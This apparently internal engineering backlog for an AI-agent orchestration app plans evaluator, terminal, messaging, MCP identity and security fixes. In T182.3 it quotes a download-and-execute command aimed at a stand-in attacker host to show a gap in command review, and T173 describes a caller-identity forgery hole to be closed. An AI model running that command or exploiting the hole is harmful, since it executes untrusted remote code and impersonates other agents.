- T181: `configDir` + `localHistory` (history readers, `skills/paths.ts`, `skills/importer.ts` and
  `agents/wrappers.ts` disagree: `"claude"` vs `"claude-code"`, two opencode dirs); `isEphemeral`
  instead of `cli_type === "shell"` in ~19 places
- T161: `supportsSessionRename`, `resumeByName`
- T175.6: `emitsTurnBoundaries`
- T174: composer-ready marker + anchor per TUI
- T172: expected behaviour (asks for authorization before sharing, etc.)

---

### T192 — Evaluator: schema output, honest failure states, durable verdicts `added: 2026-09-22`
**Priority**: P1 when pipelines are in daily use, else P2 | **Effort**: M | **Source**: merge of T184.7, T183.14, review 2026-09-05 #10, T122 structured output

- Judge output is regex-scraped (`evaluator.ts:83`) with a silent score-0 fallback; failed judges'
  zeros enter the average, so an infrastructure or format failure can route the pipeline to "fix".
  Schema-validated output (tool parameter schema or `generateObject`), hard-fail when absent.
- Distinct states: valid verdict / provider failure / insufficient evidence; minimum valid judges
  before deciding.
- Resume-after-hold counts as human approval: bind the approval to the evidence reviewed; a later
  diff change invalidates it. Retry-after-provider-failure must not read as approval.
- Durable verdict rows per attempt (status, retry count) so an interrupted gate resumes.
- Report: deterministic checks and their commands before the model score.

---

### T184 — Learnings from fx, eve, pullfrog, openchamber and clay `added: 2026-08-22`
**Priority**: P1 for items 2-5 (daily-readiness list) | **Effort**: varies | **Source**: 4-agent read
of the repos Antonio brought + fx.sh docs. Clones under `_repos_2_learn/github.com/`. Every claim
about OUR code below was reproduced before filing; two of the reviewers' claims did NOT reproduce
and are recorded as refuted at the end.

(Item 1, pipeline evidence lost once the agent commits, shipped 2026-09-22 in PR #115; see
`TASK_COMPLETED/2609.md`.)

**Latent bugs in the sidecar (openchamber).** All three verified:

2. **Nothing answers a terminal query while detached.** The sidecar only ever writes to its clients,
   never back into the PTY — so with no xterm attached (the normal case for a background agent) a
   shell's DA1/colour queries go unanswered and fish waits ~10s at startup. Their note names it
   exactly: "the DA1 fallback prevents Fish from waiting ten seconds for a renderer that cannot
   observe or answer its startup query." Note T183.1 answers OSC 10/11/12 in the RENDERER only, so
   this is the other half of that fix.
3. **The ring buffer replays query sequences.** Replay is raw ANSI, so every reattach re-asks the new
   xterm every question the shell ever asked. They store history sanitized (DSR, CPR, DA1, Mode 2031,
   OSC 10-12 stripped) while the live stream stays byte-identical — two paths, not one.
4. **We kill the previous sidecar by pid without verifying identity.** `ensureSidecar` SIGTERMs then
   SIGKILLs a live-but-unresponsive pid with no check that it is still ours; a recycled pid gets
   killed. Theirs keeps one file per process with `{pid, ownerPid, port, binary}` and re-verifies the
   live process before killing, only when `ppid === 1` or the owner is dead.

**Spawn and lifecycle (pullfrog).**

5. **A failing `beforeAgent` silently prevents the agent from starting.** `agent-spawn-flow.ts:300-301`
   builds `beforeAgent && <command>`; `&&` short-circuits, so a failed `npm install` means the CLI
   never launches and nothing says why. They run the hook separately, capture structured failure, and
   TELL THE AGENT in a dedicated `SETUP HOOK FAILED` prompt section. Their hook timeout is 10 min;
   ours is 2, too short for a cold install.
6. **We check that an API key exists, never that it works** (pairs with T183.2: prefer the logged-in CLI, probe the key as fallback). `doctor.ts:339` tests for a non-empty
   string, so a revoked key passes the doctor and fails inside a PTY at spawn. Their 40-line liveness
   probe returns `alive | dead | unknown` with a 5s timeout, and only lists providers whose live-200
   AND bad-key rejection have both been measured — `unknown` never rewrites a working config.
7. Evaluator output is regex-scraped (`evaluator.ts:83-91`): moved to T192.
8. **Merge PR has no guard.** `diff-pr.ts:51-52` defaults to `--squash` + `--delete-branch` (strategy is now a parameter) with no base-protection check; they refuse a
   direct merge when the base is unprotected ("base branch not protected — refusing CI-ungated
   merge") and prefer GitHub-native auto-merge with `expectedHeadOid`.
9. **PR body is `--fill`** — body = commit messages, no footer, no link back to the agent run. Their
   sentinel-delimited footer with strip-before-append makes PR-body updates idempotent, and records
   which model ran and WHY a model was substituted.
10. **Stop-hook gate.** A 15-line bash hook curls a localhost server that can answer
    `{decision:"block", reason}` — the agent cannot end its turn with a dirty tree or an unmet
    contract. We already write per-agent hook settings AND already run a node binary from a PreToolUse
    hook, so the plumbing exists. Highest leverage per line in that repo.
11. **Effort as a `[0,1]` position** mapped onto each CLI's own published ladder, always rounding
    DOWN so it can never cost more than asked. We have no effort concept at all.
12. Lazy context (paths, not payloads): merged into T183.11.

**Context budgeting (clay + monocode, same piece from two sides).**

13. **Deterministic pre-compaction, ~30 lines and no API call** (same context-budget track as T183.1 occupancy): at 90% of budget keep the last N
    turns whole and collapse older TOOL RESULTS to a marker. LLM summarization stays a manual user
    action, and their reasoning is the part worth keeping: an automatic LLM compaction "risks failing
    exactly when the context is already overloaded." We have no compaction logic at all — only
    `diff-budget.ts` and a 2000-token memory cap.

**Observability (clay).**

14. **The state we scrape for is a first-class variable inside these CLIs and is never emitted.**
    clay has `CLAY_APP_PROMPTING` with a state-change hook, and its own comment says the opaque slot
    is "for the driver (the main loop today, an agent daemon later)". Confirms T123's hook approach is
    the right shape and that scraping is what is left when a CLI exposes nothing.
15. **A CLI's own journal is a liveness signal, not just history.** clay writes a turn as `"pending"`
    BEFORE the request and rewrites it after, so a trailing `pending` means "running right now" —
    scrape-free, ANSI-immune. Extends T181's store readers from "what happened" to "what is happening".

**Permissions (fx).** Their model is worth adopting as a FRAMING: read/list/glob/search need no
approval, only state-changing calls do, and an approval grants exactly the scope shown rather than a
category. Our access modes are a sentence in the prompt plus an env var — not a gate. The T175 claim
guard is the only thing that actually intercepts, and only for claude-code.

**Refuted — recorded so nobody re-files them:**
- *"History expansion breaks the spawn"*: measured on a real PTY with histexpand confirmed active
  (control: `echo !e` expanded). `!`, `!important` and `!!` inside our quoted heredoc all pass, because
  bash history-expands only the FIRST line of a command and our prompt text is always a continuation
  line. Bracketed paste is on and we do not wrap the payload — fragile, not broken.
- *"Spawn context is rebuilt uncached every spawn"*: the expensive part already is cached —
  `skills/loader.ts:49` memoizes the per-skill `execSync` binary checks with a TTL. File reads and the
  MCP tool context are rebuilt, which is cheap.

**Explicitly NOT worth copying:** pullfrog's Linux/CI-only namespace sandbox (wrong threat model —
our agent runs as the user on the user's machine) and its bot-identity commit authorship (T142 already
ruled that out; single human identity keeps CODEOWNERS working); openchamber's five-surface matrix,
12-locale i18n, client-side multi-run, and in-process server (our sidecar is why terminals survive a
reload); clay's NULL-absorbing JSON accessors and first-word command allowlist.

---

### T183 — Learnings from monocode, mcp_agent_mail_rust and proliferate `added: 2026-08-19`
**Priority**: P1 for items 1-3 | **Effort**: varies | **Source**: 3-agent read of the repos Antonio
brought (2026-08-19). Clones under `_repos_2_learn/github.com/`. Every claim about OUR code below
was re-verified before filing.

(Terminal fidelity — alt-screen fit and OSC 10/11/12 replies — shipped 2026-08-19 under the
name "T183.1" (PR #114); see `TASK_COMPLETED/2608.md`. That name predates this list: item 1
below, context occupancy, is still open.)

**The two product-level misses (monocode).**

1. **Context-window occupancy is a number we do not have.** Every `token_usage` query we own is
   `SUM(input + output)` — cumulative SPEND. Occupancy is a different quantity and the actionable
   one ("am I about to get compacted?"). Their framing is the insight: it is a LEVEL, not a total —
   each turn reports the size of the prompt it just sent, so the newest reading REPLACES the
   previous one and compaction is free (after compacting, the next report is simply smaller). And
   the window size is read from the CLI (`modelUsage[*].contextWindow`), never from a model table
   that goes stale. Ring in the terminal toolbar, amber 75% / red 90%.
   → `main/tokens/log-parser.ts`, `renderer/components/terminal/TerminalToolbar.tsx`, a wave migration.
2. **Four features are dark until the user pastes an API key**: `agents/scoring.ts`,
   `ipc/procedures/diff-ai.ts` (the Sparkles commit button), `pipeline/evaluator.ts`,
   `pipeline/evidence.ts` — all through `callAnthropicMessage` with `x-api-key`. monocode spawns the
   user's ALREADY-AUTHENTICATED `claude` headless and isolated
   (`--no-session-persistence --strict-mcp-config --mcp-config '{"mcpServers":{}}' --settings '{"disableAllHooks":true}'`)
   for commit messages, PR titles and branch names. No key, nothing to configure, no double payment.
   → new `main/lib/headless-claude.ts` behind the existing `callAnthropicMessage` signature, API key
   as fallback.

**The coordination gaps (mcp_agent_mail_rust).** Verified against our code, not taken on faith:

3. Claims TTL and 4. glob overlap: moved to T175.4 (claims track).
5. **Commit-time guard.** Our own tool description already admits "writes through shell commands are
   never intercepted". Their `pre-commit` hook reads active reservations from JSON in the git archive
   — so it works with the server DOWN — and blocks by default with an explicit bypass env var. We
   block BEFORE the write, they block after the work is done; the answer is both, not either.
6. Threads: moved to T162 (rooms). 7. Asserted ack: moved to T175.1. 8. Idempotency payload
   fingerprint: moved to T170.1.
9. **`agents_list` spans every project** (`listActiveAgents` filters by status only) and cross-project
   `agent_send` is unrestricted. Theirs has a per-agent contact policy
   (`open|auto|contacts_only|block_all`) and a deliberately vague rejection that does not leak
   whether the recipient exists.
10. **A hook is a second delivery route.** We already own the channel (T123 per-agent `--settings`).
    A `SessionStart`/`PostToolUse` hook printing unread mail costs zero PTY risk and covers exactly
    what injection cannot: an agent parked on a permission dialog (we correctly refuse to inject),
    providers with no boundary signal, and post-restart. INVERT both of their defaults — theirs
    re-prints already-read mail on every Bash call, a permanent token tax.

**The pipeline handoff (proliferate).**

11. **We pass terminal scrapings between steps.** `{{previousOutput}}` resolves to `outputSummary`,
    which is read from the previous agent's SCROLLBACK (`pipeline-helpers.ts:33`), and `{{diff}}` is
    an inlined git diff. They hand off through FILES — `.proliferate/context/<runId>/NN-slug.md`,
    referenced as `@doc:slug` — and never pass a diff at all: a reviewer is told to inspect the
    worktree itself, with only a manifest of changed files and per-file diff hashes stored. Strictly
    less lossy, far cheaper in tokens, and survives a restart for free.
    → `main/pipeline/context.ts`, `pipeline-step-handler.ts`, `packages/shared/src/types/pipeline.ts`
12. Durable delegation outbox: moved to T170.3.
13. **Cheap and worth copying now**: a static fan-out cap on any agent-spawns-agent path (theirs:
    8 per parent, depth 1) and ONE documented canonical lock-acquisition order. We acquire worktree
    locks, DB writes and sidecar RPCs in whatever order each call site needed.
14. Durable judge verdicts: moved to T192.

**Explicitly NOT worth copying:**
- Their sender authentication is OFF by default and identity is a tmux-pane file with three legacy
  fallbacks — a symptom of not owning the process. We mint a token at spawn and revoke on exit.
- proliferate's workflow triggers: the README claims "recurring and event-driven" and there are NO
  automated triggers of any kind — no cron, no webhook, no schedule column. Our `scheduler/engine.ts`
  is ahead of them on this axis.
- proliferate's intra-workspace concurrency: two in-process locks, no per-file arbitration at all.
  Our path claims are the differentiated thing here — keep them.
- 900k LOC for a mailbox, with a live Bayes-risk policy that can release other agents' reservations
  on by default. Take the deadlock detector (Tarjan SCC over the conflict graph, surfaced as an
  advisory notification), leave the rest.

---

### T182 — Findings from the round-9 code review `added: 2026-08-19`
**Priority**: P1 for item 8 (daily use); rest P2 | **Effort**: S-M each | **Source**: 4-agent correctness review
over `eb6b37e..HEAD` (the T175/T180/T170.1/T166.1/T179.3/T181 wave)

Everything below was CONFIRMED by execution, not by reading. The fixes that shipped with the
review are in `TASK_COMPLETED/2608.md`; these are the ones that need more than a patch.

1. `ppid` is client-supplied, so the process-tree fallback can name another agent: moved to T173.
2. (Symlinked claim paths shipped 2026-08-19; the `pathsOverlap` residual moved to T175.4.)
3. **Repo-authored run commands have no review step.** `inspectCommand` on
   `.exegol/actions.yaml` is a seatbelt, not a boundary — a `Makefile` target or a
   `package.json` script reaches the PTY without it, and even in actions.yaml
   `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one "this repo
   defines N run commands — review them" confirmation covering every source, remembered per
   repo. (The comment no longer overclaims.)
4. **A `queued` message whose receiver's pane was closed reports `delivered: false` on
   retry** — `agent-messaging.ts#duplicateResult` → `getMessageEntry` returns undefined when
   either FK is NULL, and `messages` FKs are `ON DELETE SET NULL`. Closing a pane now archives
   rather than deletes (shipped), so this needs a real delete to trigger — but denormalizing
   the sender/receiver ids onto the message row would close it for good.
5. **`identityMemo` never evicts** (`mcp/exegol-server.ts`) — keyed on a client-supplied pid,
   overwritten but never deleted. Also never consulted on the path it was written for: the
   claim guard deliberately sends no `ppid`. Either wire it to a bounded cache or delete it.
6. **The MCP activity ring loses "connected but never spoke"** — `exegol-server.ts` announces
   a connection lazily on the first non-`check_path` message, so a shim that connects and dies
   before its first `list_tools` produces zero records. Announce on the first AUTHENTICATED
   message instead.
7. (DB init failure guard shipped 2026-09-22; see `TASK_COMPLETED/2609.md`.)
8. **`listSessionHistory` pagination has no pager yet** — the `, a.id DESC` tiebreaker shipped,
   but `history.list` still takes no `offset` and the UI has no paging. Add both together.

---

### T181 — Session history per repo `added: 2026-08-18`
**Priority**: P2 | **Effort**: S remaining | **Source**: Antonio, 2026-08-18

Core shipped 2026-08-18 (see `TASK_COMPLETED/2608.md`): retention, the merged timeline, and
local-store adapters for claude-code / codex / opencode. Remaining:

- **Remaining providers have nothing to read** (surveyed 2026-08-19, see `TASK_COMPLETED`):
  `crush` has a proper sessions table but zero rows and no cwd column; `amp` keeps only
  file-change directories; `kiro`, `kilocode` and `devin` keep settings/extensions/plans and no
  session store. Revisit `crush` if it starts being used — scoping would go through
  `files.path`. Six adapters now cover every CLI that records anything.
- **Resume from history.** The rows carry the provider's own session id; the launch modal
  already knows how to resume. A local session Exegol never launched is the interesting case.
- **Purge UI.** Nothing is deleted automatically any more, and `oplog` stores git trees, so the
  DB grows. There is no user-facing way to reclaim it — Settings needs a size readout and an
  explicit "purge older than N".
- **`shell` rows are still deleted at startup**, so a terminal tab never appears in history.
  Correct today (no task, no score); revisit if plain terminals become worth remembering.
  Deeper, from the round-9 simplify: the *trigger* is wrong. Every other part of the shell
  lifecycle is handled at EXIT (`agent-session-callbacks.ts` skips scoring/memory/final_output;
  the renderer store auto-cleans on final status). Delete the row where the shell ends and the
  startup sweep disappears — it also currently runs before `runStartupRecovery`, whose
  reattach has explicit handling for shells still alive in the sidecar.
- **Retention has three homes and no statement of policy**: the shell delete and the
  ANSI-memory delete in `cleanupStaleData`, plus `agent_events` at 30 days in
  `notify-handler.ts`. One `db/retention.ts` declaring per-table policy, invoked once.
- `cli_type === "shell"` literal in ~19 places (`isEphemeral` capability): moved to T191.
- **Derive `capabilities.json` instead of hand-maintaining it.** The parity test stops a
  procedure shipping dead, but it also makes the trpc half of the allowlist a copy of the
  router — it can no longer deny anything. The property worth keeping is deny-by-default for
  a compromised renderer (browser panes are webviews in this app), so the fix is to mark
  intent AT the router (a `rendererProcedure` builder or `.meta({ exposed: true })`) and
  generate the file from that, asserting only "exposed ⇔ listed". Then a new procedure is
  denied until someone opts it in.
- Normalize paths inside `db/queries/path-claims.ts`: moved to T175.4.
- Per-provider filesystem knowledge (`configDir`, `localHistory`): moved to T191.

---

### T175 — Coordination follow-ups deferred from the round-7 simplify `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over `test/agent-collab-round6`

Real findings that needed more than a cleanup, so they were not folded into that branch.
(Item 1 — enforcing claims — shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.)

1. **`consumed` means two different things.** Pull-consumed is a receipt (the agent's own
   authenticated call); turn-consumed is an inference ("a boundary happened after we wrote bytes")
   that a swallowed submit would report as read. Either add provenance (`via: "pull" | "turn"`) or
   reserve `consumed` for evidenced reads and call the inferred one `presumed_read`. Absorbs T183.7:
   mcp_agent_mail asserts it (`ack_required` → `acknowledge_message` → `ack_ts`, plus a "sent N ago,
   still unacked" view).
2. **`MAX_MESSAGE_CHARS` (12 000) is now incoherent with pointer delivery.** The cap existed because
   of the paste; bodies now travel as JSON over a socket. The cap is exactly what forces senders to
   split at send time — the bug pointer delivery was built to kill. Raise it hard, or drop it and
   bound total queued bytes instead.
3. **The worktree preference is honoured by 1 of 4 launchers.** `SpawnAgentModal` reads it;
   `QuickLaunchBar` and `EmptyPaneContent` omit `useWorktree` entirely (→ shared tree) and
   `ParallelSpawnModal` hardcodes `true`. If it is a project property it belongs in
   `projects.default_isolation` (that table already has `default_branch`/`default_ide`) and should
   be read in `agent-spawn-flow`, not per call site. Matters more now: whether a spawn shares the
   tree decides whether path claims are load-bearing or dead code.
4. **Claims track: no human surface, no TTL, prefix-only overlap.** Zero tRPC/UI references: the
   user arbitrates a stuck claim but cannot see or break one, and a stuck `waiting_input` agent holds
   its files forever (`w3_004_path_claims` has no `expires_at`). Absorbs:
   - T183.3 TTL: mandatory, clamped [60s, 1y], default 1h, plus renew, force-release, expiry sweep
   - T183.4 globs: `pathsOverlap` (`path-claims.ts:46`) is `a===b || startsWith`, so
     `src/**/*.test.ts` never overlaps `src/auth.test.ts`. Conflicts with the T172.1 decision
     ("NOT globs", module header): decide before building
   - T181/T182.2 residual: `canonical()` inside `db/queries/path-claims.ts` on insert and every
     comparison, so no caller can store an unresolved path
5. **`warnIfCommittable` is a log line nobody reads** for a credential in the user's repo. The
   NotificationBus already carries `resource:warning`/`budget:warning`; this deserves the same.
   (Made async in round 7 so it no longer blocks the spawn path.)
6. **Composer-ready from the PTY emulator, not a second parser.** The round-7 `ESC[?2004h` sniff was
   removed (most TUIs enable it once at startup, so it never fired, and it cost a hot-path scan).
   The `HeadlessEmulator` already parses this mode; a `getBracketedPaste(id): boolean | null`
   accessor on PtyHost would give the tri-state properly if readiness detection is wanted later.
   Better still: `emitsTurnBoundaries` as a declared field (T191).

---

### T174 — Learnings from Orca (stablyai) `added: 2026-08-13`
**Priority**: P2 | **Effort**: varies | **Source**: 2-agent code read of stablyai/orca, 2026-08-13
(clone at `~/_repos_2_learn/github.com/stablyai/orca`)

Orca is a mature Electron orchestrator (~311k LOC, ~1:1 test ratio). Read for how it solves what
we solve. **It does not use MCP at all** — its agent-facing API is the `orca` CLI, invoked via
Bash. Confirms MCP-vs-CLI is a genuine fork, not a right/wrong; we stay on MCP (schema-validated,
no Bash permission needed), accepting that a provider without MCP can't participate.

Already adopted 2026-08-13: pointer-not-body delivery for long messages, submit on a separate
write, closing the paste on the failure path, boundary-signals-beat-quiescence.

Still worth taking, roughly by value:
- ~~**Fair-share diff truncation**~~ — DONE 2026-08-13: `main/lib/diff-budget.ts`, wired into all
  three head-truncating call sites (commit messages, evaluator judges, evidence summaries).
- **Per-provider composer-ready spec** (lands in T191) (`src/shared/draft-paste-ready-scanner.ts:26-70`): each TUI
  declares a marker + anchor (codex `›`, opencode `ESC[?25h`, grok `❯` anchored to alt-screen and
  REVOKED on exit because starship uses the same glyph). We took the provider-agnostic half
  (`ESC[?2004h`); the per-provider table is the precise version.
- One-outstanding-delivery-per-run in DDL + replay-until-ack: moved to T170.3.
- **Declare which signal is authoritative and which is fallback.** We run THREE paths for one
  job — OSC-777 through the PTY, hook events dropped as files, and the scraped output parser —
  with the precedence living implicitly in the order of `if`s. That has already cost us: the
  `oscDeliveredAgents` guard exists because two paths applied the same signal twice, and the
  `ESC[?2004h` composer sniff was added and removed the same day for the same reason. Orca types
  it (`pane-agent-evidence.ts:80-117` returns `source: 'hook'|'title'|'none'` with
  `confidence: 'authoritative'|'fallback'`, hooks going stale after 30 min); Superset runs a
  SINGLE path. Either discipline beats three mechanisms racing. Cheapest version: one resolver
  returning `{status, source, confidence}` instead of scattered `continue`s.

  Comparison that prompted this (Superset, via Antonio 2026-08-13): one shared `notify.sh`
  registered in each CLI's own config, identity via `SUPERSET_AGENT_ID`, an early `exit 0` when
  not inside a Superset terminal, POSTing to the host. Our `agents/wrappers.ts` is the same
  design arrived at independently, guard included — so the hook itself needs nothing. Two
  differences worth weighing: they hook `SessionStart`/`SessionEnd` (we infer session start),
  and both Superset AND Orca chose HTTP where we drop files. File-drop needs no port or token
  and survives the app being down; HTTP gives the hook a status code and does not depend on
  `fs.watch`, which loses events under load on macOS. Our events dir being empty proves we
  consume, not that nothing was missed.

- **Preamble that bans the agent's native ask-user UI**: a worker opening its own TUI prompt hangs
  the coordinator invisibly. Exactly the failure we hit with codex demanding authorization.
- **Never collapse "can't tell" into "dead"** (`src/main/daemon/AGENTS.md`): only a positive signal
  proves occupancy; a timeout proves nothing. Our crash-recovery alive/dead classification is that
  bug class.
- **Symlinked shared directories across worktrees** (one `node_modules` serves all) and background
  worktree deletion — removing a `node_modules` tree synchronously blocked their IPC 8-35s.

---

### T179 — Complements from Athas (athasdev/athas) `added: 2026-08-13`
**Priority**: P2 | **Effort**: S-M each | **Source**: competitor read, clone at
`~/_repos_2_learn/github.com/athasdev/athas`

Checked first: **the WebAssembly terminal engine is not for us.** Athas ships `ghostty-web`
behind a feature flag with `status: "experimental"`, `default: false`, and keeps the FULL
xterm.js addon suite alongside it — an alternative engine, not a replacement. Because the wasm
engine has no addon ecosystem they hand-rolled search and serialize, and their serialize
returns PLAIN TEXT (`translateToString(true)`). Our reattach depends on ANSI-preserving
serialization (`headless-emulator.snapshot()` via SerializeAddon) — plain text would destroy
exactly the fidelity we fixed on 2026-08-13. Revisit only for VT correctness, never for speed.

Worth taking:
1. **Feature flags as a system.** Every Athas feature carries id/name/description/icon and an
   optional `status: "experimental"`, plus a settings search index. The ghostty case is the
   argument: it lets you LAND something risky off-by-default instead of not landing it. We have
   been shipping large changes with no flag at all.
2. **Local history.** Per-file snapshots with `reason: save | auto-save | restore | manual`,
   content hash, size, and restore-with-diff (`local-history-api.ts`). More valuable for us than
   for a normal IDE because AGENTS edit the files: the oplog stores git trees per operation, so
   there is no way to open one file and see its timeline. That is exactly the question after an
   agent touches something.
3. **`persistentCommands`** — last-used commands float to the top of the palette. Tiny.

(Item 3, run actions, shipped 2026-08-16; see `TASK_COMPLETED/2608.md`. LSP code lens stays
out — it needs an LSP we do not have.)

---

### T170 — Messaging durability + generalized idempotency `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over the T165/T168 round (2026-08-13)

Follow-ups the review flagged as right-but-bigger than that commit.
(Item 1 — delivery state in the DB — shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.)

1. **Generalize idempotency to the RPC layer.** Today only `agent_send` is safely
   retryable, and the retry is performed by the MODEL following prose. The shim already has
   a per-call id — make it stable across reconnects and have the server replay the recorded
   response for a repeated id. Then every tool is retryable and the shim can retry itself.
   Build it when the SECOND tool needs it, not with another bespoke key. Absorbs T183.8: the
   same `client_key` with a different body silently returns the old message; store a payload
   fingerprint and error on mismatch.
2. Tokenless config: moved to T173.
3. **Durable delivery outbox.** Absorbs T183.12 and the T174 DDL note: deliveries table with
   lease token, `attempt_count`, `next_attempt_at`, dead-letter, written in the SAME transaction
   as the terminal turn event; one outstanding delivery per run enforced in DDL, replay until ack.

---

### T171 — Human authorization over the agent bus `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: live 3-agent session + Juanito's field report (2026-08-13)

[[T168]] fixed the common case (collaboration is pre-authorized, so no permission is needed
to share analysis). This is the remaining half: when a step GENUINELY needs the user, the bus
has no way to carry an authorization the receiver can verify. draco was right to refuse
Juanito's word for it — and stayed blocked until Antonio went to its terminal by hand.

Wanted: an agent can escalate through the channel; the user approves once from Exegol
(NotificationBus + Attention Inbox already exist); the receiver gets an authorization
**signed by Exegol**, never relayed by the requesting agent. Pairs with T169's ownership
question — who may act on which files while several agents coordinate.

---

### T166 — MCP shim architecture (deferred from the 2026-08-12 shim review) `added: 2026-08-12`
**Priority**: P2 | **Effort**: M-L | **Source**: 4-agent shim /simplify — security + correctness landed same day; these are the architectural residuals

(Input caps and the credential warning shipped 2026-08-16; see `TASK_COMPLETED/2608.md`.
The `.gitignore` upsert bullet was DROPPED: [[T173]] settled that Exegol must not gitignore
files a team may legitimately version — the warning goes to the human instead.)

- **Third NDJSON framing copy in `pty-sidecar-entry.ts`** — the server and the sidecar
  client now share `createNdjsonBuffer` (cap + multibyte decoder); the sidecar's own reader
  is still hand-rolled and unbounded. Deferred only because it is bundled into the sidecar,
  so fixing it requires a `SIDECAR_VERSION` bump — every live PTY dies on the next launch.
  Fold it into the next change that has to bump anyway.
- **`buffer.indexOf("\n")` rescans from 0 on every chunk** in `createNdjsonBuffer`: a 7 MB
  tool result arriving in 64 KB chunks scans ~110× up to 7 MB. The cap bounds each scan but
  not the quadratic; a `searchFrom` offset carried across calls makes it linear.
- **MCP recall is FTS-only**: `exegol-tools.ts` calls `searchMemories` without
  `ollamaConfig`, while `ipc/procedures/memory.ts` passes it — agents get worse recall than
  the UI for the same store.

- **`hello` handshake on connect** (shim version, agentId, token source, pid): today the
  server logs `shim #7` and cannot tell a returning shim from a stranger, nor a stale one
  from a current one. With it: "3 agents on an outdated shim — restart those sessions"
  becomes a surfaced, actionable state instead of an invisible failure. Also lets the shim
  `report` its own state (outbox depth, outage duration, token source) into the activity
  ring — today the shim is observability-dark (stderr is swallowed by the CLI).
- **Shim as a thin pipe**: forward raw MCP messages (`mcp_message {token, msg}`) so
  initialize/ping/tools-list/tools-call/result-encoding all run in the RUNNING app. What
  stays frozen in a shim then is irreducible: framing, token resolve, reconnect (~60 LOC
  vs ~270). Every future drift stops needing a per-method proxy.
- Descriptor table for the per-provider config writers: moved to T191.
- **Drop `EXEGOL_ACCESS_MODE`**: display-only, stale by construction (never rewritten when
  the user changes mode), never delivered to codex; enforcement is 100% server-side.
- codex cwd→token 1:1: moved to T173.
- **Socket squat probe**: `connect()` succeeding is treated as "another Exegol owns it" —
  verify `lstat` isSocket + uid, and handshake before trusting; surface "refused to start"
  in the MCP panel instead of one log line.
- Extract `provisionAgentMcp`/`deprovision` out of `buildPtyInvocation` (a command builder
  that writes files, mutates the token registry and starts a socket server).

---

### T172 — Orchestration primitives (from a real coordinated round) `added: 2026-08-13`
**Priority**: P1 | **Effort**: L (split before starting) | **Source**: Juanito's round-2 report,
2026-08-13 — one claude coordinating a codex + an opencode across 3 tasks / 9 files / 0 collisions

Validated first, so we don't undo it: stable identity, `message_id`/`in_reply_to`, and the
pre-authorization clause all held for a full assign → work → report → review → feedback cycle.
The gaps below are what the coordinator had to cover BY HAND.

1. ~~**File reservation**~~ — DONE 2026-08-13: `claim_paths` / `release_paths` / `list_claims`
   over a `path_claims` table. All-or-nothing (a partial grant reads as success and sends the
   agent into the collision it asked us to prevent), directory claims cover their tree, paths
   stored absolute so separate worktrees never conflict, claims released on agent exit, and the
   protocol is in the managed AGENTS.md block so agents know to claim before editing. NOT globs
   — see the module header for why. Ownership across worktrees stays with [[T169]].
2. **Reports are claims, not evidence.** Both agents reported "lint clean, tsc exit 0" and both
   were telling the truth — but the coordinator could only know by re-running everything. The
   bus carries prose only. Note Exegol ALREADY observes the diff (T130 evidence, oplog, scoring):
   the right altitude is Exegol ATTACHING what it verified (files touched, diff hash, exit codes)
   to a message, not a self-reported `artifacts` field the agent fills in.
3. **`status` is too coarse.** `running`/`waiting_input` doesn't say whether an agent is on MY
   task, finished and idle, or off doing something else. Needs task-level state: who assigned
   what, and where it is.
4. Broadcast / shared session context: moved to T162 (rooms).
5. ~~**`delivered` is transport, not comprehension**~~ — DONE: `message_status` now reports
   `consumed` once the target closes a turn after the injection.
6. ~~**4000-char cap**~~ — DONE: raised to 12 000.
7. ~~**No retract**~~ — DONE: `message_cancel` withdraws a message still in our queue; it
   refuses honestly once the text has reached the terminal.

**Provider behaviour differs and the orchestrator can't know in advance** (codex demanded human
authorization, opencode asked nothing): declared per provider in T191.

**Remaining**: 2 (attach the diff Exegol already captures — highest value of what's left) and
3 (task-level state).

---

### T173 — Per-session MCP identity, no token in a repo file `added: 2026-08-13`
**Priority**: P1 (security hygiene) | **Effort**: M | **Source**: Juanito, 2026-08-13 · merges T166 codex cwd→token, T170.2, T182.1

`opencode.json` (repo root) carries `EXEGOL_MCP_TOKEN_FILE`; `.mcp.json`, `.gemini/settings.json`,
`.devin/`, `.agents/` are the same shape. The credential is bounded — per session, revoked on
exit, and the server rejects tokens whose agent isn't live — but it should not be committable at
all. Exegol must NOT gitignore these itself: they are legitimate project config a team may want
versioned, and we only insert the `exegol` key. Shipped for now: a warning at spawn when the
file isn't ignored.

Real fix, and it deletes code rather than adding it: wherever the CLI forwards its env to MCP
servers, the per-session token already arrives via the PTY (`EXEGOL_MCP_TOKEN_FILE` + shim
env-preference) and the file needs no secret at all. Verify per provider with TWO sessions of the
same provider in one cwd; the single-session case looks identical either way and proves nothing.
For every CLI that forwards, drop the file token, the multi-binding registry, the `ps` walk and
the `-32003` ambiguity path.

Where a CLI does NOT forward (codex today): two codex agents in one cwd still share a token file
at runtime. Force a unique cwd for on-disk-token flavors or refuse the second; persist cwd on the
agent row (reattach, exit cleanup and pipeline agents all re-derive it today).

Then close the forgery hole (was T182.1): `ppid` is client-supplied, so
`mcp/exegol-server.ts#resolveContext` can resolve an agent as a sibling; access is capped at the
caller's token but the IDENTITY is the sibling's, so `agent_send` can be forged and
`release_paths` can drop a claim. Once no token is shared, require `resolveByParentPid` to land
inside the token's own bindings and delete the fallback. Node exposes no `SO_PEERCRED`.

---

### T169 — Worktree coordination model (coordinator + workers) `added: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: Antonio's working pattern, 2026-08-13

Two shapes, both real, and messaging should serve each:
- **One repo, one folder**: the coordinator (e.g. Juanito) holds the main checkout; helpers
  get their own temporary worktrees so parallel edits don't collide, and hand work back as
  commits/PRs the coordinator reviews. Needs: spawn-with-worktree from a link/room, and the
  coordinator being told the branch/PR to review.
- **Front + back (separate folders)**: no worktree needed — the folders already isolate.
  The coordinator's value is sequencing and review, not conflict avoidance. This is the
  cross-project case, so the origin line in the message header matters.

Depends on the T162 link roles (reviewer/feedback) and pairs with T166's per-agent MCP
identity, which is what makes several agents in one cwd viable at all.

---

### T158 — Memory Habit Protocol `added: 2026-08-11`
